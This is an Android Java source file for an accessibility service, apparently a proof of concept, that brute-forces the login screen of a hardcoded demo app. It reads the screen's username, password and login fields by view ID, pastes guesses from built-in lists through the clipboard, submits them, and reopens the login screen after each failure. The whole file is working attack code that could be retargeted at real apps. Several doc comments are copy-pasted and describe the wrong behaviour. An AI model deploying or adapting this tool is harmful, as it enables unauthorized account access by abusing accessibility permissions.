package com.example.acService;

/**
 * Created by res on 7/9/14.
 */
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class RecorderService extends AccessibilityService {

    static final String TAG = "RecorderService";

    /* Variables holding the target application details */
    private String packageName;
    private String activityName;
    private String successActivityName;
    private String failureActivityName;

    /* Bruteforce booleans */
    private boolean startBruteforce = false;
    private boolean bruteforceRunning = false;

    /* Sample user/pass data */
    private String[] usernames = {"admin", "res"};
    private String[] passwords = {"beep", "boop", "boom"};
    /* Counters */
    private int userCount = 0, passCount = -1;

    /**
     *
     * Returns the path of the image specified in the intent provided
     *
     * @param  event     the event which has occured
     * @return           string representation of the event type
     *
     */
    private String getEventType(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                return "TYPE_NOTIFICATION_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                return "TYPE_VIEW_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                return "TYPE_VIEW_FOCUSED";
            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
                return "TYPE_VIEW_LONG_CLICKED";
            case AccessibilityEvent.TYPE_VIEW_SELECTED:
                return "TYPE_VIEW_SELECTED";
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                return "TYPE_WINDOW_STATE_CHANGED";
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                return "TYPE_VIEW_TEXT_CHANGED";
        }
        return "default";
    }

    /**
     *
     * Returns the path of the image specified in the intent provided
     *
     * @param  event     the event which has occured
     * @return           string representation of the event's text
     *
     */
    private String getEventText(AccessibilityEvent event) {
        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }
        return sb.toString();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        /* TODO: Optimize */

        /* Get the source of the event */
        AccessibilityNodeInfo source = event.getSource();

        /* If the source is the target app and bruteforce is enabled, do stuff */
        if(source != null && event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                && event.getPackageName().equals(packageName) && startBruteforce == true){

            /* Continue only if bruteforce is running */
            if(bruteforceRunning){

                /* If we have obtained the success activity defined, stop! */
                if(event.getClassName().equals(successActivityName)){
                    bruteforceRunning = false;
                    startBruteforce = false;
                }
                /* Else, if it is the failure activity, go back to our login activity */
                else if(event.getClassName().equals(failureActivityName)){
                    Intent intent = new Intent();
                    intent.setAction(Intent.ACTION_VIEW);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    intent.setClassName("com.example.LoginDemo", "com.example.LoginDemo.MyActivity");
                    startActivity(intent);

                }
                /* Else, if it is the login activity, try logging in  */
                else if(event.getClassName().equals(activityName)){
                    tryLogin(source);
                }

            }
        }


        /* Enable the below code for logging all events */
        /*Log.v(TAG, String.format(
                "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
                event.toString(), event.getClassName(), event.getPackageName(),
                event.getEventTime(), getEventText(event)));

        */
    }

    @Override
    public void onInterrupt() {
        Log.v(TAG, "onInterrupt");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.v(TAG, "onServiceConnected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;

        setServiceInfo(info);

        /* TODO: Get the required info for brute-force (package, class, fields, submit button) */
        /* Hardcoded package and class name now */

        packageName = "com.example.LoginDemo";
        activityName = "com.example.LoginDemo.MyActivity";
        successActivityName = "com.example.LoginDemo.SuccessAActivity";
        failureActivityName = "com.example.LoginDemo.FailureActivity";

        /* Allow bruteforce */
        startBruteforce = true;
        bruteforceRunning = true;

    }

    /**
     *
     * Returns the path of the image specified in the intent provided
     *
     * @param  node      An accessibility node which contains all the elements we need
     * @return           nothing
     *
     */

    void tryLogin(AccessibilityNodeInfo node){

        /* if we have passwords remaining to test with a username, try it */
        if(passCount < passwords.length-1){
            passCount++;
        }
        /* Else, if we reached the end of passwords, but there are usernames, go to next username and retry passwords from beginning*/
        else if(passCount == passwords.length-1 && userCount < usernames.length-1){
            userCount++;
            passCount = 0;
        }
        /* Else, if we have exhausted all usernames and passwords, stop bruteforce */
        else if(passCount == passwords.length-1 && userCount == usernames.length-1){
            bruteforceRunning = false;
            return;
        }

        /* Let's begin. */
        AccessibilityNodeInfo node2;
        AccessibilityNodeInfo usernode = null, passnode = null, submitnode = null;
        /* Go through all children of our main node and find the user and password inputs and the submit button */
        for(int i =0; i< node.getChildCount(); i++){
            node2 = node.getChild(i);
            if(node2!= null && node2.getViewIdResourceName() != null) {
                if(node2.getViewIdResourceName().equals(packageName+":id/username")){
                    usernode = node2;
                }else if(node2.getViewIdResourceName().equals(packageName+":id/password")){
                    passnode = node2;
                }else if(node2.getViewIdResourceName().equals(packageName+":id/login")){
                    submitnode = node2;
                }
            }
        }

        /* If we have all the elements*/
        if(usernode != null && passnode!= null && submitnode != null){
            ClipboardManager clipboard = (ClipboardManager) this.getSystemService(Context.CLIPBOARD_SERVICE);

            /* Copy/Paste the username in to the user input field*/
            ClipData clip = ClipData.newPlainText("label", usernames[userCount]);
            clipboard.setPrimaryClip(clip);
            usernode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
            usernode.performAction(AccessibilityNodeInfo.ACTION_PASTE);

            /* Copy/Paste password in to password input field*/
            clip = ClipData.newPlainText("label2", passwords[passCount]);
            clipboard.setPrimaryClip(clip);
            passnode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
            passnode.performAction(AccessibilityNodeInfo.ACTION_PASTE);

            Log.d("BRUTEFORCE: Logging in with ", usernames[userCount] +" - "+ passwords[passCount] );
            /* Click submit! */
            submitnode.performAction(AccessibilityNodeInfo.ACTION_CLICK);

        }


    }

}